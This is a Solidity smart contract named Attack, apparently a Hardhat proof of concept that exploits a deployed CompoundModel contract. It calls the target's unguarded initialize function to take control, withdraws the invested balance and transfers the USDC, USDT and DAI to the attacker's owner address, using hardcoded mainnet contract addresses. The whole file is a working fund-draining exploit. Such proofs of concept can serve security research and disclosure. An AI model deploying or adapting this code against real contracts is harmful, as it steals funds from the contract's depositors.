// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

import "./CompoundModel.sol";
import "hardhat/console.sol";

contract Attack {

    address compoundModelAddr = 0x3BC6aA2D25313ad794b2D67f83f21D341cc3f5fb;
    address usdcAddr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address cusdcAddr = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address compTokenAddr = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address comptrollerAddr = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address uniswapV2router02Addr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address usdtAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address cusdtAddr = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
    address daiAddr = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address cdaiAddr = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address payable owner;

    CompoundModel cm = CompoundModel(compoundModelAddr);

    constructor() {
        owner = payable(msg.sender);
    }

    function exploit_one_token(address tokenAddr, address cTokenAddr) public {
        cm.initialize(address(this), tokenAddr, cTokenAddr, compTokenAddr, comptrollerAddr, uniswapV2router02Addr);
        cm.invest();
        uint256 balanceToWithdraw = cm.underlyingBalanceWithInvestment();
        if (balanceToWithdraw > 0) {
            cm.withdrawToForge(balanceToWithdraw);
            IERC20(tokenAddr).transfer(owner, IERC20(tokenAddr).balanceOf(address(this)));
            console.log("[ATK] Success!");
        }
        else {
            console.log("[ATK] Frontrun-bot got us...");
        }
    }

    function exploit_all() public {
        exploit_one_token(usdcAddr, cusdcAddr);
        exploit_one_token(usdtAddr, cusdtAddr);
        exploit_one_token(daiAddr,  cdaiAddr);
    }

    function checkBalance() public {
        uint256 balance = IERC20(daiAddr).balanceOf(owner);
        console.log("[ATK] Owner DAI Balance is: ", balance);
        balance = IERC20(usdcAddr).balanceOf(owner);
        console.log("[ATK] Owner USDC Balance is: ", balance);
        balance = IERC20(usdtAddr).balanceOf(owner);
        console.log("[ATK] Owner USDT Balance is: ", balance);
    }
}
